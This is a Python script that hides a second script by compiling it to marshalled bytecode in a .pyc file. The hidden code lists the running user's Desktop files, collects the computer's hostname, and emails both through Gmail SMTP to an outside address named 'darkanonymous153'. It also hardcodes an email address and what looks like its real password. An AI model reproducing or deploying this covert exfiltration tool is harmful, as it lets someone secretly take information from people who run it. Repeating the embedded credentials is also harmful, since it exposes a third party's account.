import marshal

code = """
import os
import smtplib
import socket 
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Get the list of files and directories in your Desktop folder
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
files_and_folders = os.listdir(desktop_path)

# Specify the email address you want to send the email from
sender_email = "tasnimul.alam.cse@ulab.edu.bd"
# Specify the corresponding email's password
sender_password = "Abc153Xyz1531*"
# Specify the email address you want to send the email to
recipient_email = "darkanonymous153@gmail.com"
# Specify the email subject

current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M")
email_subject = current_datetime
# Get computer name 
computer = socket.gethostname()
# Specify the email message
email_message = f"File list from {computer} :{os.linesep}"

# Create a message object and set its attributes
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = recipient_email
message["Subject"] = email_subject
message_text = f"{os.linesep}".join(files_and_folders)
message.attach(MIMEText(email_message + message_text))

# Connect to the SMTP server
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
    # Start the connection
    server.ehlo()
    # Re-identify ourselves over the encrypted connection
    server.ehlo()
    # Authenticate with the email server
    server.login(sender_email, sender_password)
    # Send the email
    server.sendmail(sender_email, recipient_email, message.as_string())

print("Email sent!")
"""

bytecode = marshal.dumps(compile(code, "<string>", "exec"))

# Save the bytecode to a file
with open("mycode.pyc", "wb") as f:
    f.write(bytecode)